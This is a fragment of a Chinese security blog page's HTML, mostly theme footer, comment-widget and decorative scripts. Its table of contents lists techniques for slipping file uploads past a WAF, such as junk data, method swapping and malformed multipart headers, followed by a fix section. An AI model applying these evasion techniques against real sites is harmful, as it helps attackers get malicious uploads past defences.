class="nav-number">2.2.8.</span> <span class="nav-text">过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">2.2.8.1.</span> <span class="nav-text">垃圾数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST-GET%E4%BA%92%E7%9B%B8%E6%94%B9"><span class="nav-number">2.2.8.2.</span> <span class="nav-text">POST&#x2F;GET互相改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%AE%9E%E4%BD%93%E4%B8%AD%E7%9A%84Content-Type%E5%AD%97%E6%AE%B5"><span class="nav-number">2.2.8.3.</span> <span class="nav-text">删除实体中的Content-Type字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4Content-Disposition%E5%AD%97%E6%AE%B5%E9%87%8C%E7%9A%84%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.2.8.4.</span> <span class="nav-text">删除Content-Disposition字段里的空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Boundary%E8%BE%B9%E7%95%8C%E4%B8%8D%E4%B8%80%E8%87%B4"><span class="nav-number">2.2.8.5.</span> <span class="nav-text">Boundary边界不一致</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.</span> <span class="nav-text">修复</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2021 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunyyer</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'IhfX5WEErU6TrVrSPhuSibXl-gzGzoHsz',
+        appKey: 'LbVYIKKbnW4la4hc4kS5l8xA',
+        placeholder: 'welcome',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show.js"></script>
+<!--显示标签栏标题 -->
+<script type="text/javascript" src="/js/funnytitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="112,128,144" opacity='1' zIndex="-2" count="140" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+<!--背景下雪-->
+<script type="text/javascript" src="/js/snow.js"></script>
